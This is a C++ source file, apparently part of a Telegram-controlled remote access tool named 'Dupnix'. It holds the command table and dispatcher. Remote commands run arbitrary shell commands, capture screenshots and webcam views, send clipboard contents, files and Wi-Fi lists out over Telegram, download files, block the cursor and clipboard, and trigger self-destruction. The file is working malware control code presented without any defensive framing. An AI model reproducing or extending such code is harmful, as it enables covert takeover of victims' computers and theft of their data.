#include "execute.h"

#include <vector>
#include <utility>
#include <functional>
#include <string>
#include <iostream>

#include <nlohmann/json.hpp>

#include "tools.h"
#include "parse.h"
#include "telegram.h"
#include "globals.h"
#include "commands.h"

std::vector <std::pair<std::string, void(*)(std::string)>> commands{
	{"ALL_ID", [](std::string cmd) { telegram::SendText("Dont use it with ID."); }},
	{"Status", getStatus},
	{"SetID", setID},
	{"Cmd", [](std::string cmd) { system(cmd.c_str()); }},
	{"CmdOutput", [](std::string cmd) { telegram::SendText(tools::info::cmdOutput(cmd.c_str())); }},
	{"FunctionList", [](std::string) {
		std::string list;
		for (auto& i : commands) {
			list += i.first + "\n";
		}
		telegram::SendText(list);
	}},
	{"Volume", setVolume},
	{"Screenshot", Screenshot},
	{"MonitorOff", monitorOff},
	{"MonitorOn", monitorOn},
	{"ChangeCfg", ChangeCfg},
	{"CheckCfg", [](std::string) {telegram::SendText(tools::info::loadCfg().dump()); }},
	{"SetCursor", SetCursor},
	{"Delay", Delay},
	{"BlockCursor", BlockCursor},
	{"BlockClipboard", BlockClipboard},
	{"Press", Press},
	{"Hotkey", hotkeys},
	{"SendClipboard", SendClipboard},
	{"Autodestruction", Autodestruction},
	{"WriteToClipboard", WriteToClipboard},
	{"ProcessList", ProcessList},
	{"IsFileExists", IsFileExists},
	{"WebcamView", WebcamView},  // isnt tested
	{"ErrorSound", [](std::string) { MessageBeep(1); }},  // Doesnt works on my pc
	{"RunningApps", RunningApps},
	{"ListOfFiles", ListOfFiles},
	{"WifiList", WifiList},
	{"CloseForeground", TurnCloseForeground},
	{"DownloadFile", DownloadFile},
	{"SendFile", SendFile},
	{"shell", shell},
	{"UpdateDupnix", UpdateDupnix}
};

void cleanup() {
	tools::CdToDefault();
}

namespace execute {
	void execute(parse::ParsedMessage PM) {
		if (PM.ID != ID and PM.ID != INSTANCE_ID)
			return;
		std::clog << "Executing: " << PM.command << " with parameters: " << PM.parameters << std::endl;

		// when there is only id, return status
		if (PM.command.empty() and PM.parameters.empty()) {
			getStatus("");
			return;
		}

		for (auto &i : commands) {
			if (tools::toLowerCase(i.first) == tools::toLowerCase(PM.command)) {
				i.second(PM.parameters);
				cleanup();
				return;
			}
		}
		telegram::SendText(ID + ", function: " + PM.command + " not found. Try FunctionList to check possible functions.");
	}
}  // namespace execute
